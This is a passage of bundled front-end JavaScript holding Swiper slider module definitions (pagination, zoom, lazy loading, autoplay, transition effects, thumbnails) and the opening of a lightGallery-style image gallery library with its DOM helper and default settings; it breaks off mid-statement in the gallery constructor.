                slidesLengthChange() {
                  const e = this;
                  e.params.loop &&
                    (e.pagination.render(), e.pagination.update());
                },
                snapGridLengthChange() {
                  const e = this;
                  e.params.loop ||
                    (e.pagination.render(), e.pagination.update());
                },
                destroy() {
                  this.pagination.destroy();
                },
                click(e) {
                  const t = this;
                  t.params.pagination.el &&
                    t.params.pagination.hideOnClick &&
                    t.pagination.$el.length > 0 &&
                    !d(e.target).hasClass(t.params.pagination.bulletClass) &&
                    (!0 ===
                    t.pagination.$el.hasClass(t.params.pagination.hiddenClass)
                      ? t.emit("paginationShow", t)
                      : t.emit("paginationHide", t),
                    t.pagination.$el.toggleClass(
                      t.params.pagination.hiddenClass
                    ));
                },
              },
            },
            {
              name: "scrollbar",
              params: {
                scrollbar: {
                  el: null,
                  dragSize: "auto",
                  hide: !1,
                  draggable: !1,
                  snapOnRelease: !0,
                  lockClass: "swiper-scrollbar-lock",
                  dragClass: "swiper-scrollbar-drag",
                },
              },
              create() {
                const e = this;
                h.extend(e, {
                  scrollbar: {
                    init: R.init.bind(e),
                    destroy: R.destroy.bind(e),
                    updateSize: R.updateSize.bind(e),
                    setTranslate: R.setTranslate.bind(e),
                    setTransition: R.setTransition.bind(e),
                    enableDraggable: R.enableDraggable.bind(e),
                    disableDraggable: R.disableDraggable.bind(e),
                    setDragPosition: R.setDragPosition.bind(e),
                    getPointerPosition: R.getPointerPosition.bind(e),
                    onDragStart: R.onDragStart.bind(e),
                    onDragMove: R.onDragMove.bind(e),
                    onDragEnd: R.onDragEnd.bind(e),
                    isTouched: !1,
                    timeout: null,
                    dragTimeout: null,
                  },
                });
              },
              on: {
                init() {
                  const e = this;
                  e.scrollbar.init(),
                    e.scrollbar.updateSize(),
                    e.scrollbar.setTranslate();
                },
                update() {
                  this.scrollbar.updateSize();
                },
                resize() {
                  this.scrollbar.updateSize();
                },
                observerUpdate() {
                  this.scrollbar.updateSize();
                },
                setTranslate() {
                  this.scrollbar.setTranslate();
                },
                setTransition(e) {
                  this.scrollbar.setTransition(e);
                },
                destroy() {
                  this.scrollbar.destroy();
                },
              },
            },
            {
              name: "parallax",
              params: { parallax: { enabled: !1 } },
              create() {
                const e = this;
                h.extend(e, {
                  parallax: {
                    setTransform: U.setTransform.bind(e),
                    setTranslate: U.setTranslate.bind(e),
                    setTransition: U.setTransition.bind(e),
                  },
                });
              },
              on: {
                beforeInit() {
                  const e = this;
                  e.params.parallax.enabled &&
                    ((e.params.watchSlidesProgress = !0),
                    (e.originalParams.watchSlidesProgress = !0));
                },
                init() {
                  this.params.parallax.enabled && this.parallax.setTranslate();
                },
                setTranslate() {
                  this.params.parallax.enabled && this.parallax.setTranslate();
                },
                setTransition(e) {
                  this.params.parallax.enabled &&
                    this.parallax.setTransition(e);
                },
              },
            },
            {
              name: "zoom",
              params: {
                zoom: {
                  enabled: !1,
                  maxRatio: 3,
                  minRatio: 1,
                  toggle: !0,
                  containerClass: "swiper-zoom-container",
                  zoomedSlideClass: "swiper-slide-zoomed",
                },
              },
              create() {
                const e = this,
                  t = {
                    enabled: !1,
                    scale: 1,
                    currentScale: 1,
                    isScaling: !1,
                    gesture: {
                      $slideEl: void 0,
                      slideWidth: void 0,
                      slideHeight: void 0,
                      $imageEl: void 0,
                      $imageWrapEl: void 0,
                      maxRatio: 3,
                    },
                    image: {
                      isTouched: void 0,
                      isMoved: void 0,
                      currentX: void 0,
                      currentY: void 0,
                      minX: void 0,
                      minY: void 0,
                      maxX: void 0,
                      maxY: void 0,
                      width: void 0,
                      height: void 0,
                      startX: void 0,
                      startY: void 0,
                      touchesStart: {},
                      touchesCurrent: {},
                    },
                    velocity: {
                      x: void 0,
                      y: void 0,
                      prevPositionX: void 0,
                      prevPositionY: void 0,
                      prevTime: void 0,
                    },
                  };
                "onGestureStart onGestureChange onGestureEnd onTouchStart onTouchMove onTouchEnd onTransitionEnd toggle enable disable in out"
                  .split(" ")
                  .forEach((s) => {
                    t[s] = K[s].bind(e);
                  }),
                  h.extend(e, { zoom: t });
                let s = 1;
                Object.defineProperty(e.zoom, "scale", {
                  get: () => s,
                  set(t) {
                    if (s !== t) {
                      const s = e.zoom.gesture.$imageEl
                          ? e.zoom.gesture.$imageEl[0]
                          : void 0,
                        i = e.zoom.gesture.$slideEl
                          ? e.zoom.gesture.$slideEl[0]
                          : void 0;
                      e.emit("zoomChange", t, s, i);
                    }
                    s = t;
                  },
                });
              },
              on: {
                init() {
                  this.params.zoom.enabled && this.zoom.enable();
                },
                destroy() {
                  this.zoom.disable();
                },
                touchStart(e) {
                  this.zoom.enabled && this.zoom.onTouchStart(e);
                },
                touchEnd(e) {
                  this.zoom.enabled && this.zoom.onTouchEnd(e);
                },
                doubleTap(e) {
                  const t = this;
                  t.params.zoom.enabled &&
                    t.zoom.enabled &&
                    t.params.zoom.toggle &&
                    t.zoom.toggle(e);
                },
                transitionEnd() {
                  const e = this;
                  e.zoom.enabled &&
                    e.params.zoom.enabled &&
                    e.zoom.onTransitionEnd();
                },
                slideChange() {
                  const e = this;
                  e.zoom.enabled &&
                    e.params.zoom.enabled &&
                    e.params.cssMode &&
                    e.zoom.onTransitionEnd();
                },
              },
            },
            {
              name: "lazy",
              params: {
                lazy: {
                  enabled: !1,
                  loadPrevNext: !1,
                  loadPrevNextAmount: 1,
                  loadOnTransitionStart: !1,
                  elementClass: "swiper-lazy",
                  loadingClass: "swiper-lazy-loading",
                  loadedClass: "swiper-lazy-loaded",
                  preloaderClass: "swiper-lazy-preloader",
                },
              },
              create() {
                const e = this;
                h.extend(e, {
                  lazy: {
                    initialImageLoaded: !1,
                    load: Z.load.bind(e),
                    loadInSlide: Z.loadInSlide.bind(e),
                  },
                });
              },
              on: {
                beforeInit() {
                  const e = this;
                  e.params.lazy.enabled &&
                    e.params.preloadImages &&
                    (e.params.preloadImages = !1);
                },
                init() {
                  const e = this;
                  e.params.lazy.enabled &&
                    !e.params.loop &&
                    0 === e.params.initialSlide &&
                    e.lazy.load();
                },
                scroll() {
                  const e = this;
                  e.params.freeMode &&
                    !e.params.freeModeSticky &&
                    e.lazy.load();
                },
                resize() {
                  this.params.lazy.enabled && this.lazy.load();
                },
                scrollbarDragMove() {
                  this.params.lazy.enabled && this.lazy.load();
                },
                transitionStart() {
                  const e = this;
                  e.params.lazy.enabled &&
                    (e.params.lazy.loadOnTransitionStart ||
                      (!e.params.lazy.loadOnTransitionStart &&
                        !e.lazy.initialImageLoaded)) &&
                    e.lazy.load();
                },
                transitionEnd() {
                  const e = this;
                  e.params.lazy.enabled &&
                    !e.params.lazy.loadOnTransitionStart &&
                    e.lazy.load();
                },
                slideChange() {
                  const e = this;
                  e.params.lazy.enabled && e.params.cssMode && e.lazy.load();
                },
              },
            },
            {
              name: "controller",
              params: {
                controller: { control: void 0, inverse: !1, by: "slide" },
              },
              create() {
                const e = this;
                h.extend(e, {
                  controller: {
                    control: e.params.controller.control,
                    getInterpolateFunction: J.getInterpolateFunction.bind(e),
                    setTranslate: J.setTranslate.bind(e),
                    setTransition: J.setTransition.bind(e),
                  },
                });
              },
              on: {
                update() {
                  const e = this;
                  e.controller.control &&
                    e.controller.spline &&
                    ((e.controller.spline = void 0),
                    delete e.controller.spline);
                },
                resize() {
                  const e = this;
                  e.controller.control &&
                    e.controller.spline &&
                    ((e.controller.spline = void 0),
                    delete e.controller.spline);
                },
                observerUpdate() {
                  const e = this;
                  e.controller.control &&
                    e.controller.spline &&
                    ((e.controller.spline = void 0),
                    delete e.controller.spline);
                },
                setTranslate(e, t) {
                  this.controller.control && this.controller.setTranslate(e, t);
                },
                setTransition(e, t) {
                  this.controller.control &&
                    this.controller.setTransition(e, t);
                },
              },
            },
            {
              name: "a11y",
              params: {
                a11y: {
                  enabled: !0,
                  notificationClass: "swiper-notification",
                  prevSlideMessage: "Previous slide",
                  nextSlideMessage: "Next slide",
                  firstSlideMessage: "This is the first slide",
                  lastSlideMessage: "This is the last slide",
                  paginationBulletMessage: "Go to slide {{index}}",
                },
              },
              create() {
                const e = this;
                h.extend(e, {
                  a11y: {
                    liveRegion: d(
                      `<span class="${e.params.a11y.notificationClass}" aria-live="assertive" aria-atomic="true"></span>`
                    ),
                  },
                }),
                  Object.keys(Q).forEach((t) => {
                    e.a11y[t] = Q[t].bind(e);
                  });
              },
              on: {
                init() {
                  const e = this;
                  e.params.a11y.enabled &&
                    (e.a11y.init(), e.a11y.updateNavigation());
                },
                toEdge() {
                  this.params.a11y.enabled && this.a11y.updateNavigation();
                },
                fromEdge() {
                  this.params.a11y.enabled && this.a11y.updateNavigation();
                },
                paginationUpdate() {
                  this.params.a11y.enabled && this.a11y.updatePagination();
                },
                destroy() {
                  this.params.a11y.enabled && this.a11y.destroy();
                },
              },
            },
            {
              name: "history",
              params: {
                history: { enabled: !1, replaceState: !1, key: "slides" },
              },
              create() {
                const e = this;
                h.extend(e, {
                  history: {
                    init: ee.init.bind(e),
                    setHistory: ee.setHistory.bind(e),
                    setHistoryPopState: ee.setHistoryPopState.bind(e),
                    scrollToSlide: ee.scrollToSlide.bind(e),
                    destroy: ee.destroy.bind(e),
                  },
                });
              },
              on: {
                init() {
                  this.params.history.enabled && this.history.init();
                },
                destroy() {
                  this.params.history.enabled && this.history.destroy();
                },
                transitionEnd() {
                  const e = this;
                  e.history.initialized &&
                    e.history.setHistory(e.params.history.key, e.activeIndex);
                },
                slideChange() {
                  const e = this;
                  e.history.initialized &&
                    e.params.cssMode &&
                    e.history.setHistory(e.params.history.key, e.activeIndex);
                },
              },
            },
            {
              name: "hash-navigation",
              params: {
                hashNavigation: {
                  enabled: !1,
                  replaceState: !1,
                  watchState: !1,
                },
              },
              create() {
                const e = this;
                h.extend(e, {
                  hashNavigation: {
                    initialized: !1,
                    init: te.init.bind(e),
                    destroy: te.destroy.bind(e),
                    setHash: te.setHash.bind(e),
                    onHashCange: te.onHashCange.bind(e),
                  },
                });
              },
              on: {
                init() {
                  this.params.hashNavigation.enabled &&
                    this.hashNavigation.init();
                },
                destroy() {
                  this.params.hashNavigation.enabled &&
                    this.hashNavigation.destroy();
                },
                transitionEnd() {
                  this.hashNavigation.initialized &&
                    this.hashNavigation.setHash();
                },
                slideChange() {
                  const e = this;
                  e.hashNavigation.initialized &&
                    e.params.cssMode &&
                    e.hashNavigation.setHash();
                },
              },
            },
            {
              name: "autoplay",
              params: {
                autoplay: {
                  enabled: !1,
                  delay: 3e3,
                  waitForTransition: !0,
                  disableOnInteraction: !0,
                  stopOnLastSlide: !1,
                  reverseDirection: !1,
                },
              },
              create() {
                const e = this;
                h.extend(e, {
                  autoplay: {
                    running: !1,
                    paused: !1,
                    run: se.run.bind(e),
                    start: se.start.bind(e),
                    stop: se.stop.bind(e),
                    pause: se.pause.bind(e),
                    onVisibilityChange() {
                      "hidden" === document.visibilityState &&
                        e.autoplay.running &&
                        e.autoplay.pause(),
                        "visible" === document.visibilityState &&
                          e.autoplay.paused &&
                          (e.autoplay.run(), (e.autoplay.paused = !1));
                    },
                    onTransitionEnd(t) {
                      e &&
                        !e.destroyed &&
                        e.$wrapperEl &&
                        t.target === this &&
                        (e.$wrapperEl[0].removeEventListener(
                          "transitionend",
                          e.autoplay.onTransitionEnd
                        ),
                        e.$wrapperEl[0].removeEventListener(
                          "webkitTransitionEnd",
                          e.autoplay.onTransitionEnd
                        ),
                        (e.autoplay.paused = !1),
                        e.autoplay.running
                          ? e.autoplay.run()
                          : e.autoplay.stop());
                    },
                  },
                });
              },
              on: {
                init() {
                  const e = this;
                  e.params.autoplay.enabled &&
                    (e.autoplay.start(),
                    document.addEventListener(
                      "visibilitychange",
                      e.autoplay.onVisibilityChange
                    ));
                },
                beforeTransitionStart(e, t) {
                  const s = this;
                  s.autoplay.running &&
                    (t || !s.params.autoplay.disableOnInteraction
                      ? s.autoplay.pause(e)
                      : s.autoplay.stop());
                },
                sliderFirstMove() {
                  const e = this;
                  e.autoplay.running &&
                    (e.params.autoplay.disableOnInteraction
                      ? e.autoplay.stop()
                      : e.autoplay.pause());
                },
                touchEnd() {
                  const e = this;
                  e.params.cssMode &&
                    e.autoplay.paused &&
                    !e.params.autoplay.disableOnInteraction &&
                    e.autoplay.run();
                },
                destroy() {
                  const e = this;
                  e.autoplay.running && e.autoplay.stop(),
                    document.removeEventListener(
                      "visibilitychange",
                      e.autoplay.onVisibilityChange
                    );
                },
              },
            },
            {
              name: "effect-fade",
              params: { fadeEffect: { crossFade: !1 } },
              create() {
                const e = this;
                h.extend(e, {
                  fadeEffect: {
                    setTranslate: ie.setTranslate.bind(e),
                    setTransition: ie.setTransition.bind(e),
                  },
                });
              },
              on: {
                beforeInit() {
                  const e = this;
                  if ("fade" !== e.params.effect) return;
                  e.classNames.push(`${e.params.containerModifierClass}fade`);
                  const t = {
                    slidesPerView: 1,
                    slidesPerColumn: 1,
                    slidesPerGroup: 1,
                    watchSlidesProgress: !0,
                    spaceBetween: 0,
                    virtualTranslate: !0,
                  };
                  h.extend(e.params, t), h.extend(e.originalParams, t);
                },
                setTranslate() {
                  "fade" === this.params.effect &&
                    this.fadeEffect.setTranslate();
                },
                setTransition(e) {
                  "fade" === this.params.effect &&
                    this.fadeEffect.setTransition(e);
                },
              },
            },
            {
              name: "effect-cube",
              params: {
                cubeEffect: {
                  slideShadows: !0,
                  shadow: !0,
                  shadowOffset: 20,
                  shadowScale: 0.94,
                },
              },
              create() {
                const e = this;
                h.extend(e, {
                  cubeEffect: {
                    setTranslate: ae.setTranslate.bind(e),
                    setTransition: ae.setTransition.bind(e),
                  },
                });
              },
              on: {
                beforeInit() {
                  const e = this;
                  if ("cube" !== e.params.effect) return;
                  e.classNames.push(`${e.params.containerModifierClass}cube`),
                    e.classNames.push(`${e.params.containerModifierClass}3d`);
                  const t = {
                    slidesPerView: 1,
                    slidesPerColumn: 1,
                    slidesPerGroup: 1,
                    watchSlidesProgress: !0,
                    resistanceRatio: 0,
                    spaceBetween: 0,
                    centeredSlides: !1,
                    virtualTranslate: !0,
                  };
                  h.extend(e.params, t), h.extend(e.originalParams, t);
                },
                setTranslate() {
                  "cube" === this.params.effect &&
                    this.cubeEffect.setTranslate();
                },
                setTransition(e) {
                  "cube" === this.params.effect &&
                    this.cubeEffect.setTransition(e);
                },
              },
            },
            {
              name: "effect-flip",
              params: { flipEffect: { slideShadows: !0, limitRotation: !0 } },
              create() {
                const e = this;
                h.extend(e, {
                  flipEffect: {
                    setTranslate: ne.setTranslate.bind(e),
                    setTransition: ne.setTransition.bind(e),
                  },
                });
              },
              on: {
                beforeInit() {
                  const e = this;
                  if ("flip" !== e.params.effect) return;
                  e.classNames.push(`${e.params.containerModifierClass}flip`),
                    e.classNames.push(`${e.params.containerModifierClass}3d`);
                  const t = {
                    slidesPerView: 1,
                    slidesPerColumn: 1,
                    slidesPerGroup: 1,
                    watchSlidesProgress: !0,
                    spaceBetween: 0,
                    virtualTranslate: !0,
                  };
                  h.extend(e.params, t), h.extend(e.originalParams, t);
                },
                setTranslate() {
                  "flip" === this.params.effect &&
                    this.flipEffect.setTranslate();
                },
                setTransition(e) {
                  "flip" === this.params.effect &&
                    this.flipEffect.setTransition(e);
                },
              },
            },
            {
              name: "effect-coverflow",
              params: {
                coverflowEffect: {
                  rotate: 50,
                  stretch: 0,
                  depth: 100,
                  scale: 1,
                  modifier: 1,
                  slideShadows: !0,
                },
              },
              create() {
                const e = this;
                h.extend(e, {
                  coverflowEffect: {
                    setTranslate: re.setTranslate.bind(e),
                    setTransition: re.setTransition.bind(e),
                  },
                });
              },
              on: {
                beforeInit() {
                  const e = this;
                  "coverflow" === e.params.effect &&
                    (e.classNames.push(
                      `${e.params.containerModifierClass}coverflow`
                    ),
                    e.classNames.push(`${e.params.containerModifierClass}3d`),
                    (e.params.watchSlidesProgress = !0),
                    (e.originalParams.watchSlidesProgress = !0));
                },
                setTranslate() {
                  "coverflow" === this.params.effect &&
                    this.coverflowEffect.setTranslate();
                },
                setTransition(e) {
                  "coverflow" === this.params.effect &&
                    this.coverflowEffect.setTransition(e);
                },
              },
            },
            {
              name: "thumbs",
              params: {
                thumbs: {
                  swiper: null,
                  multipleActiveThumbs: !0,
                  autoScrollOffset: 0,
                  slideThumbActiveClass: "swiper-slide-thumb-active",
                  thumbsContainerClass: "swiper-container-thumbs",
                },
              },
              create() {
                const e = this;
                h.extend(e, {
                  thumbs: {
                    swiper: null,
                    init: oe.init.bind(e),
                    update: oe.update.bind(e),
                    onThumbClick: oe.onThumbClick.bind(e),
                  },
                });
              },
              on: {
                beforeInit() {
                  const e = this,
                    { thumbs: t } = e.params;
                  t && t.swiper && (e.thumbs.init(), e.thumbs.update(!0));
                },
                slideChange() {
                  this.thumbs.swiper && this.thumbs.update();
                },
                update() {
                  this.thumbs.swiper && this.thumbs.update();
                },
                resize() {
                  this.thumbs.swiper && this.thumbs.update();
                },
                observerUpdate() {
                  this.thumbs.swiper && this.thumbs.update();
                },
                setTransition(e) {
                  const t = this.thumbs.swiper;
                  t && t.setTransition(e);
                },
                beforeDestroy() {
                  const e = this.thumbs.swiper;
                  e && this.thumbs.swiperCreated && e && e.destroy();
                },
              },
            },
          ];
        void 0 === O.use &&
          ((O.use = O.Class.use), (O.installModule = O.Class.installModule)),
          O.use(le);
        const de = O;
        var ce = function () {
          return (ce =
            Object.assign ||
            function (e) {
              for (var t, s = 1, i = arguments.length; s < i; s++)
                for (var a in (t = arguments[s]))
                  Object.prototype.hasOwnProperty.call(t, a) && (e[a] = t[a]);
              return e;
            }).apply(this, arguments);
        };
        !(function () {
          if ("function" == typeof window.CustomEvent) return !1;
          window.CustomEvent = function (e, t) {
            t = t || { bubbles: !1, cancelable: !1, detail: null };
            var s = document.createEvent("CustomEvent");
            return s.initCustomEvent(e, t.bubbles, t.cancelable, t.detail), s;
          };
        })(),
          Element.prototype.matches ||
            (Element.prototype.matches =
              Element.prototype.msMatchesSelector ||
              Element.prototype.webkitMatchesSelector);
        var pe = (function () {
          function e(e) {
            return (
              (this.cssVenderPrefixes = [
                "TransitionDuration",
                "TransitionTimingFunction",
                "Transform",
                "Transition",
              ]),
              (this.selector = this._getSelector(e)),
              (this.firstElement = this._getFirstEl()),
              this
            );
          }
          return (
            (e.generateUUID = function () {
              return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(
                /[xy]/g,
                function (e) {
                  var t = (16 * Math.random()) | 0;
                  return ("x" == e ? t : (3 & t) | 8).toString(16);
                }
              );
            }),
            (e.prototype._getSelector = function (e, t) {
              return (
                void 0 === t && (t = document),
                "string" != typeof e
                  ? e
                  : ((t = t || document),
                    "#" === e.substring(0, 1)
                      ? t.querySelector(e)
                      : t.querySelectorAll(e))
              );
            }),
            (e.prototype._each = function (e) {
              return this.selector
                ? (void 0 !== this.selector.length
                    ? [].forEach.call(this.selector, e)
                    : e(this.selector, 0),
                  this)
                : this;
            }),
            (e.prototype._setCssVendorPrefix = function (e, t, s) {
              var i = t.replace(/-([a-z])/gi, function (e, t) {
                return t.toUpperCase();
              });
              -1 !== this.cssVenderPrefixes.indexOf(i)
                ? ((e.style[i.charAt(0).toLowerCase() + i.slice(1)] = s),
                  (e.style["webkit" + i] = s),
                  (e.style["moz" + i] = s),
                  (e.style["ms" + i] = s),
                  (e.style["o" + i] = s))
                : (e.style[i] = s);
            }),
            (e.prototype._getFirstEl = function () {
              return this.selector && void 0 !== this.selector.length
                ? this.selector[0]
                : this.selector;
            }),
            (e.prototype.isEventMatched = function (e, t) {
              var s = t.split(".");
              return e
                .split(".")
                .filter(function (e) {
                  return e;
                })
                .every(function (e) {
                  return -1 !== s.indexOf(e);
                });
            }),
            (e.prototype.attr = function (e, t) {
              return void 0 === t
                ? this.firstElement
                  ? this.firstElement.getAttribute(e)
                  : ""
                : (this._each(function (s) {
                    s.setAttribute(e, t);
                  }),
                  this);
            }),
            (e.prototype.find = function (e) {
              return he(this._getSelector(e, this.selector));
            }),
            (e.prototype.first = function () {
              return this.selector && void 0 !== this.selector.length
                ? he(this.selector[0])
                : he(this.selector);
            }),
            (e.prototype.eq = function (e) {
              return he(this.selector[e]);
            }),
            (e.prototype.parent = function () {
              return he(this.selector.parentElement);
            }),
            (e.prototype.get = function () {
              return this._getFirstEl();
            }),
            (e.prototype.removeAttr = function (e) {
              var t = e.split(" ");
              return (
                this._each(function (e) {
                  t.forEach(function (t) {
                    return e.removeAttribute(t);
                  });
                }),
                this
              );
            }),
            (e.prototype.wrap = function (e) {
              if (!this.firstElement) return this;
              var t = document.createElement("div");
              return (
                (t.className = e),
                this.firstElement.parentNode.insertBefore(t, this.firstElement),
                this.firstElement.parentNode.removeChild(this.firstElement),
                t.appendChild(this.firstElement),
                this
              );
            }),
            (e.prototype.addClass = function (e) {
              return (
                void 0 === e && (e = ""),
                this._each(function (t) {
                  e.split(" ").forEach(function (e) {
                    t.classList.add(e);
                  });
                }),
                this
              );
            }),
            (e.prototype.removeClass = function (e) {
              return (
                this._each(function (t) {
                  e.split(" ").forEach(function (e) {
                    t.classList.remove(e);
                  });
                }),
                this
              );
            }),
            (e.prototype.hasClass = function (e) {
              return (
                !!this.firstElement && this.firstElement.classList.contains(e)
              );
            }),
            (e.prototype.hasAttribute = function (e) {
              return !!this.firstElement && this.firstElement.hasAttribute(e);
            }),
            (e.prototype.toggleClass = function (e) {
              return this.firstElement
                ? (this.hasClass(e) ? this.removeClass(e) : this.addClass(e),
                  this)
                : this;
            }),
            (e.prototype.css = function (e, t) {
              var s = this;
              return (
                this._each(function (i) {
                  s._setCssVendorPrefix(i, e, t);
                }),
                this
              );
            }),
            (e.prototype.on = function (t, s) {
              var i = this;
              return this.selector
                ? (t.split(" ").forEach(function (t) {
                    Array.isArray(e.eventListeners[t]) ||
                      (e.eventListeners[t] = []),
                      e.eventListeners[t].push(s),
                      i.selector.addEventListener(t.split(".")[0], s);
                  }),
                  this)
                : this;
            }),
            (e.prototype.once = function (e, t) {
              var s = this;
              return (
                this.on(e, function () {
                  s.off(e), t(e);
                }),
                this
              );
            }),
            (e.prototype.off = function (t) {
              var s = this;
              return this.selector
                ? (Object.keys(e.eventListeners).forEach(function (i) {
                    s.isEventMatched(t, i) &&
                      (e.eventListeners[i].forEach(function (e) {
                        s.selector.removeEventListener(i.split(".")[0], e);
                      }),
                      (e.eventListeners[i] = []));
                  }),
                  this)
                : this;
            }),
            (e.prototype.trigger = function (e, t) {
              if (!this.firstElement) return this;
              var s = new CustomEvent(e.split(".")[0], { detail: t || null });
              return this.firstElement.dispatchEvent(s), this;
            }),
            (e.prototype.load = function (e) {
              var t = this;
              return (
                fetch(e).then(function (e) {
                  t.selector.innerHTML = e;
                }),
                this
              );
            }),
            (e.prototype.html = function (e) {
              return void 0 === e
                ? this.firstElement
                  ? this.firstElement.innerHTML
                  : ""
                : (this._each(function (t) {
                    t.innerHTML = e;
                  }),
                  this);
            }),
            (e.prototype.append = function (e) {
              return (
                this._each(function (t) {
                  "string" == typeof e
                    ? t.insertAdjacentHTML("beforeend", e)
                    : t.appendChild(e);
                }),
                this
              );
            }),
            (e.prototype.prepend = function (e) {
              return (
                this._each(function (t) {
                  t.insertAdjacentHTML("afterbegin", e);
                }),
                this
              );
            }),
            (e.prototype.remove = function () {
              return (
                this._each(function (e) {
                  e.parentNode.removeChild(e);
                }),
                this
              );
            }),
            (e.prototype.empty = function () {
              return (
                this._each(function (e) {
                  e.innerHTML = "";
                }),
                this
              );
            }),
            (e.prototype.scrollTop = function (e) {
              return void 0 !== e
                ? ((document.body.scrollTop = e),
                  (document.documentElement.scrollTop = e),
                  this)
                : window.pageYOffset ||
                    document.documentElement.scrollTop ||
                    document.body.scrollTop ||
                    0;
            }),
            (e.prototype.scrollLeft = function (e) {
              return void 0 !== e
                ? ((document.body.scrollLeft = e),
                  (document.documentElement.scrollLeft = e),
                  this)
                : window.pageXOffset ||
                    document.documentElement.scrollLeft ||
                    document.body.scrollLeft ||
                    0;
            }),
            (e.prototype.offset = function () {
              if (!this.firstElement) return { left: 0, top: 0 };
              var e = this.firstElement.getBoundingClientRect(),
                t = he("body").style().marginLeft;
              return {
                left: e.left - parseFloat(t) + this.scrollLeft(),
                top: e.top + this.scrollTop(),
              };
            }),
            (e.prototype.style = function () {
              return this.firstElement
                ? this.firstElement.currentStyle ||
                    window.getComputedStyle(this.firstElement)
                : {};
            }),
            (e.prototype.width = function () {
              var e = this.style();
              return (
                this.firstElement.clientWidth -
                parseFloat(e.paddingLeft) -
                parseFloat(e.paddingRight)
              );
            }),
            (e.prototype.height = function () {
              var e = this.style();
              return (
                this.firstElement.clientHeight -
                parseFloat(e.paddingTop) -
                parseFloat(e.paddingBottom)
              );
            }),
            (e.eventListeners = {}),
            e
          );
        })();
        function he(e) {
          return new pe(e);
        }
        var ue = [
          "src",
          "sources",
          "subHtml",
          "subHtmlUrl",
          "html",
          "video",
          "poster",
          "slideName",
          "responsive",
          "srcset",
          "sizes",
          "iframe",
          "downloadUrl",
          "width",
          "facebookShareUrl",
          "tweetText",
          "iframeTitle",
          "twitterShareUrl",
          "pinterestShareUrl",
          "pinterestText",
          "fbHtml",
          "disqusIdentifier",
          "disqusUrl",
        ];
        function me(e) {
          return "href" === e
            ? "src"
            : (e = (e =
                (e = e.replace("data-", "")).charAt(0).toLowerCase() +
                e.slice(1)).replace(/-([a-z])/g, function (e) {
                return e[1].toUpperCase();
              }));
        }
        var ge = function (e, t, s, i) {
            void 0 === s && (s = 0);
            var a = he(e).attr("data-lg-size") || i;
            if (a) {
              var n = a.split(",");
              if (n[1])
                for (var r = window.innerWidth, o = 0; o < n.length; o++) {
                  var l = n[o];
                  if (parseInt(l.split("-")[2], 10) > r) {
                    a = l;
                    break;
                  }
                  o === n.length - 1 && (a = l);
                }
              var d = a.split("-"),
                c = parseInt(d[0], 10),
                p = parseInt(d[1], 10),
                h = t.width(),
                u = t.height() - s,
                m = Math.min(h, c),
                g = Math.min(u, p),
                f = Math.min(m / c, g / p);
              return { width: c * f, height: p * f };
            }
          },
          fe = function (e, t, s, i, a) {
            if (a) {
              var n = he(e).find("img").first();
              if (n.get()) {
                var r = t.get().getBoundingClientRect(),
                  o = r.width,
                  l = t.height() - (s + i),
                  d = n.width(),
                  c = n.height(),
                  p = n.style(),
                  h =
                    (o - d) / 2 -
                    n.offset().left +
                    (parseFloat(p.paddingLeft) || 0) +
                    (parseFloat(p.borderLeft) || 0) +
                    he(window).scrollLeft() +
                    r.left,
                  u =
                    (l - c) / 2 -
                    n.offset().top +
                    (parseFloat(p.paddingTop) || 0) +
                    (parseFloat(p.borderTop) || 0) +
                    he(window).scrollTop() +
                    s;
                return (
                  "translate3d(" +
                  (h *= -1) +
                  "px, " +
                  (u *= -1) +
                  "px, 0) scale3d(" +
                  d / a.width +
                  ", " +
                  c / a.height +
                  ", 1)"
                );
              }
            }
          },
          ve = function (e, t, s, i, a, n) {
            var r =
                "<img " +
                s +
                " " +
                (i ? 'srcset="' + i + '"' : "") +
                "  " +
                (a ? 'sizes="' + a + '"' : "") +
                ' class="lg-object lg-image" data-index="' +
                e +
                '" src="' +
                t +
                '" />',
              o = "";
            return (
              n &&
                (o = ("string" == typeof n ? JSON.parse(n) : n).map(function (
                  e
                ) {
                  var t = "";
                  return (
                    Object.keys(e).forEach(function (s) {
                      t += " " + s + '="' + e[s] + '"';
                    }),
                    "<source " + t + "></source>"
                  );
                })),
              "" + o + r
            );
          },
          ye = {
            mode: "lg-slide",
            easing: "ease",
            speed: 400,
            licenseKey: "0000-0000-000-0000",
            height: "100%",
            width: "100%",
            addClass: "",
            startClass: "lg-start-zoom",
            backdropDuration: 300,
            container: document.body,
            startAnimationDuration: 400,
            zoomFromOrigin: !0,
            hideBarsDelay: 0,
            showBarsAfter: 1e4,
            slideDelay: 0,
            supportLegacyBrowser: !0,
            allowMediaOverlap: !1,
            videoMaxSize: "1280-720",
            defaultCaptionHeight: 0,
            ariaLabelledby: "",
            ariaDescribedby: "",
            closable: !0,
            swipeToClose: !0,
            closeOnTap: !0,
            showCloseIcon: !0,
            showMaximizeIcon: !1,
            loop: !0,
            escKey: !0,
            keyPress: !0,
            controls: !0,
            slideEndAnimation: !0,
            hideControlOnEnd: !1,
            mousewheel: !1,
            getCaptionFromTitleOrAlt: !0,
            appendSubHtmlTo: ".lg-sub-html",
            subHtmlSelectorRelative: !1,
            preload: 2,
            numberOfSlideItemsInDom: 10,
            showAfterLoad: !0,
            selector: "",
            selectWithin: "",
            nextHtml: "",
            prevHtml: "",
            index: 0,
            iframeWidth: "100%",
            iframeHeight: "100%",
            download: !0,
            counter: !0,
            appendCounterTo: ".lg-toolbar",
            swipeThreshold: 50,
            enableSwipe: !0,
            enableDrag: !0,
            dynamic: !1,
            dynamicEl: [],
            extraProps: [],
            exThumbImage: "",
            isMobile: void 0,
            mobileSettings: { controls: !1, showCloseIcon: !1, download: !1 },
            plugins: [],
          },
          be = "lgHasVideo",
          we = "lgUpdateSlides",
          xe = "lgSlideItemLoad",
          Te = "lgPosterClick",
          Ce = "lgBeforeNextSlide",
          Ee = "lgBeforePrevSlide",
          Se = 0,
          $e = (function () {
            function e(e, t) {
              if (
                ((this.lgOpened = !1),
                (this.index = 0),
                (this.plugins = []),
                (this.lGalleryOn = !1),
                (this.lgBusy = !1),
                (this.currentItemsInDom = []),
                (this.prevScrollTop = 0),
                (this.isDummyImageRemoved = !1),
                (this.mediaContainerPosition = { top: 0, bottom: 0 }),
                !e)
              )
                return this;
              if (
                (Se++,
                (this.lgId = Se),
                (this.el = e),
                (this.LGel = he(e)),
                this.generateSettings(t),
                this.buildModules(),
                this.settings.dynamic &&
                  void 0 !== this.settings.dynamicEl &&
                  !Array.isArray(this.settings.dynamicEl))
              )
